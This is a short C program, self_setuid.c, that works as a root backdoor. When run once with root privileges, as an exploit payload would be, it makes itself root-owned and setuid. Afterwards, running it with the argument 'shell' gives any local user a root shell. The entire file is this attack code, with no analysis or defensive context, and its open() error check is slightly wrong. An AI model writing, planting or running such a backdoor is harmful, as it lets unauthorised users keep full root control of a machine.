/* -*- compile-command: "gcc -Wall -Werror -static self_setuid.c -o self_setuid" -*- */
#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    if (argc == 2 && !strcmp(argv[1], "shell"))
    {
        if (setresuid(0, 0, 0))
        {
            fprintf(stderr, "++ setresuid(0, 0, 0) failed: %m\n");
            return 1;
        }
        return system("sh");
    }
    else
    {
        if (chown(argv[0], 0, 0))
        {
            fprintf(stderr, "++ chown failed: %m\n");
            return 1;
        }
        int self_fd = 0;
        if (!(self_fd = open(argv[0], 0)))
        {
            fprintf(stderr, "++ fopen failed: %m\n");
            return 1;
        }
        if (chmod(argv[0], S_ISUID | S_IXOTH) && fchmod(self_fd, S_ISUID | S_IXOTH) && fchmodat(AT_FDCWD, argv[0], S_ISUID | S_IXOTH, 0))
        {
            fprintf(stderr, "++ chmod  / fchmod / fchmodat failed: %m\n");
            close(self_fd);
            return 1;
        }
        close(self_fd);
        return 0;
    }
}
